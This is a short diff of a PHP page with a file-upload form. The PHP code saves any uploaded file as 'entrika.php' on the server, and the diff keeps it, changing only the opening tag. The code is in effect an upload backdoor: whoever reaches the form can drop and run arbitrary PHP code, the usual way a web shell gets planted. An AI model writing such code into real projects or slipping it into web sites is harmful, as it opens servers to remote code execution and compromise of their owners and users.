@@ -3,7 +3,7 @@
 Send this file: <INPUT NAME="userfile" TYPE="file">
 <INPUT TYPE="submit" VALUE="Send">
 </FORM>
-<?
-move_uploaded_file($userfile, "entrika.php"); 
+<?php
+move_uploaded_file($userfile, "entrika.php");
 ?>
 
